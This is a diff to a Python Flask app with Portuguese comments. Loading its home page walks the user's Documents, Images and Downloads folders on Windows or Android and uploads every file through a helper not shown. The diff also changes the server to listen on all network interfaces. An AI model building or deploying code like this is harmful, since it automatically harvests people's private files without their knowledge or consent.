@@ -36,7 +36,6 @@ def get_directory_path():
     if platform.system() == 'Windows':
         return r'C:\Users'  # Caminho no Windows
     elif platform.system() == 'Linux' or platform.system() == 'Darwin':  # Para Android (em ambiente Linux)
-        # Diretório acessível no Android (ajustado para armazenamento público ou diretório de documentos)
         return '/storage/emulated/0/Download'  # Exemplo de diretório de download no Android
     else:
         logging.error("Sistema operacional não suportado.")
@@ -55,29 +54,22 @@ def upload_files_from_directory(directory_path, allowed_folders, excluded_folder
     for root, dirs, files in os.walk(directory_path):
         folder_name = os.path.basename(root)
         
-        # Verifica se a pasta é permitida e não está na lista de pastas excluídas
         if is_allowed_folder(folder_name, allowed_folders) and not is_excluded_folder(folder_name, excluded_folders):
             logging.info(f"Processando arquivos da pasta: {folder_name}")
             for filename in files:
                 file_path = os.path.join(root, filename)
-                
-                # Excluir arquivos do sistema, como desktop.ini ou thumbs.db
                 if not filename.startswith('.') and filename.lower() not in ['desktop.ini', 'thumbs.db']:
                     logging.info(f"Iniciando upload do arquivo: {file_path}")
                     upload_file(file_path)
 
 @app.route('/')
 def home():
-    # Defina as pastas que você deseja permitir para upload
-    allowed_folders = ['Documentos', 'Imagens', 'Downloads']  # Exemplo de pastas permitidas
-    # Defina as pastas que você deseja excluir do upload
-    excluded_folders = ['Arquivos de Programas', 'Windows', 'AppData']  # Exemplo de pastas excluídas
-
-    # Obter o diretório correto dependendo da plataforma
+    allowed_folders = ['Documentos', 'Imagens', 'Downloads']
+    excluded_folders = ['Arquivos de Programas', 'Windows', 'AppData']
     directory_path = get_directory_path()
     
     if directory_path:
-        logging.info(f"Acessando a página principal. Iniciando upload dos arquivos de: {directory_path}")
+        logging.info(f"Iniciando upload dos arquivos de: {directory_path}")
         upload_files_from_directory(directory_path, allowed_folders, excluded_folders)
         return "Upload automático dos arquivos iniciado. Verifique os logs para o status."
     else:
@@ -92,10 +84,9 @@ def upload_file_route():
     if file.filename == '':
         return jsonify({"error": "Nenhum arquivo selecionado"}), 400
     
-    # Salva o arquivo
     file.save(os.path.join(app.config['UPLOAD_FOLDER'], file.filename))
-    
     return jsonify({"message": f"Arquivo {file.filename} enviado com sucesso!"})
 
 if __name__ == '__main__':
-    app.run(host='127.0.0.1', port=5000)
+    port = int(os.getenv('PORT', 5000))
+    app.run(host='0.0.0.0', port=port)
